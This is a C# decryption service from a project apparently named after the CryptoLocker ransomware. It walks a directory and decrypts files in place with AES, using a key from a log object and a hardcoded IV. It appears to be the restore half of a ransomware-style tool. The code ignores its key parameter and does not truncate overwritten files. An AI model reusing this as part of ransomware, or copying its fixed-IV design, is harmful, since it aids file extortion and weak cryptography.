using CryptoLocker.Abstractions;
using CryptoLocker.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Input;

namespace CryptoLocker.Implements
{
    public class DecryptService : IDecryptService
    {
        private readonly Log _log;
        public async Task Decrypt(string directoryPath, string key)
        {
            using var algorithm = Aes.Create();
            algorithm.Key = _log.HashKey;
            var iv = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 };
            algorithm.IV = iv;
            algorithm.Padding = PaddingMode.PKCS7;
            foreach (var path in GetFilesPath(directoryPath))
            {
                await DecryptStream(GetStream(path), algorithm);
            }
        }

        public DecryptService(Log log)
        {
            _log = log;
        }
        private FileStream GetStream(string path) => new FileStream(path, FileMode.Open);
        private async Task DecryptStream(FileStream fileStream, SymmetricAlgorithm algorithm)
        {
            using var cryptoStream = new CryptoStream(fileStream, algorithm.CreateDecryptor(), CryptoStreamMode.Write);
            var bytes = GetContent(fileStream);
            fileStream.Seek(0, SeekOrigin.Begin);
            await cryptoStream.WriteAsync(bytes, 0, bytes.Length);
        }
        private byte[] GetContent(FileStream stream)
        {
            var bytes = new byte[stream.Length];
            stream.Read(bytes, 0, bytes.Length);
            return bytes;
        }
        private string[] GetFilesPath(string directoryPath) 
            => Directory.GetFiles(directoryPath).Where(w => !w.Contains(".superuser")).ToArray();
    }
}
